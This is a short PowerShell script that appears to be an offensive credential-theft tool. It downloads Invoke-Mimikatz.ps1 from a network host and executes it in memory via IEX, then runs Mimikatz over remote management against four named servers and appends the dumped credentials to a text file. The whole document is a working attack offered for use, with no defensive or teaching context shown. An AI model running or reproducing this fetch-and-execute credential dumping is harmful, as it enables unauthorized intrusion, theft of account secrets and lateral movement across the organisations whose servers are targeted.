# Remote machines must have port 5985 or 5986 open
# Use NetBios names when referencing servers
$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"))
invoke-mimikatz -Computer FRSV27, FRSV210, FRSV229, FRSV97 |out-file result.txt -Append
